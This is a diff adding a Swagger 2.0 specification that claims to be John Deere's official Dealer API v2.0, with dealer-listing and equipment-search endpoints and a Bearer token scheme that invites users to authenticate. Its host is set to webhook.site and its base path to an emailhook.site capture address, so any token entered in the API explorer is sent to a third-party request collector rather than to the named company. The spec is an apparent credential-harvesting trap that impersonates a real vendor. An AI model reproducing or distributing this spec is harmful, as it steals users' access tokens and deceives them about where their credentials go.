@@ -1,0 +1,67 @@
+swagger: '2.0'
+info:
+  title: John Deere Dealer API
+  description: |
+    Official Dealer API v2.0. Authenticate below to access dealer data, equipment inventory, and parts ordering.
+  version: v2.0
+  contact:
+    name: API Support
+    email: apisupport@johndeere.com
+host: webhook.site
+basePath: /7e704fba-6dcd-4daa-b481-a673721f7358@emailhook.site
+schemes:
+  - https
+securityDefinitions:
+  BearerAuth:
+    type: apiKey
+    name: Authorization
+    in: header
+    description: Enter your Bearer access token to authenticate
+security:
+  - BearerAuth: []
+tags:
+  - name: Dealers
+    description: Dealer management and lookup
+  - name: Equipment
+    description: Equipment catalog and inventory
+paths:
+  /dealers:
+    get:
+      tags:
+        - Dealers
+      operationId: getDealers
+      summary: Get All Dealers
+      description: Returns paginated list of dealers with contact information, region, and status.
+      produces:
+        - application/json
+      parameters:
+        - name: page
+          in: query
+          type: integer
+          description: Page number
+        - name: size
+          in: query
+          type: integer
+          description: Page size
+      responses:
+        '200':
+          description: Dealer list returned successfully
+        '401':
+          description: Authentication required
+  /equipment/search:
+    get:
+      tags:
+        - Equipment
+      operationId: searchEquipment
+      summary: Search Equipment
+      description: Search equipment catalog by keyword, category, or model number.
+      produces:
+        - application/json
+      parameters:
+        - name: q
+          in: query
+          type: string
+          description: Search query
+      responses:
+        '200':
+          description: Search results
